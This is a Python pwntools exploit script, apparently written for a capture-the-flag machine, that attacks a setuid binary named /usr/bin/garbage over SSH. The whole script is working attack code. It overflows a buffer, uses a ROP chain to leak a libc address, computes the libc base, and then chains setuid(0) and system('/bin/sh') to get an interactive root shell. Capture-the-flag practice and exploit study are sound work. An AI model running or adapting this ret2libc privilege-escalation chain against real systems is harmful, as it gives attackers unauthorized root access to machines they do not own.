#!/usr/bin/env python
# $Id: exploit.py,v 1.0 2019/05/29 08:00:29 dualfade Exp $
# /usr/bin/garbage exploit --

# target dist --
# Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)

from pwn import *

# ssh --
s = ssh('margo', '10.10.10.139', password='xxxxxxx')
p = s.process("/usr/bin/garbage") # start the vuln binary

#p = process("/usr/bin/garbage") # start the vuln binary
elf = ELF("/usr/bin/garbage") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

# https://github.com/niklasb/libc-database
libc = ELF("libc-2.27.so")

# Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget
PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

# overflow until ret --
base = "A"*136

# Create rop chain
#rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS)
rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS) + p64(MAIN)

#Send our rop-chain payload
p.sendline(rop)
p.recvuntil("access denied.\n")

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

#p.close()

libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

# readelf -a /lib/x86_64-linux-gnu/libc.so.6 | grep setuid
#    23: 00000000000e5970   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5
# Note: lbc.address nik: offset --
SETUID = (libc.address + 0xe5970)
NULL = 0x00

# local user --
# rop2 = base + p64(RET) + p64(POP_RDI) +p64(BINSH) + p64(SYSTEM)

# root priv esc --
rop2 = base + p64(POP_RDI) + p64(NULL) + p64(SETUID) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

p.sendline(rop2)
p.recvuntil("access denied.\n")

p.interactive()
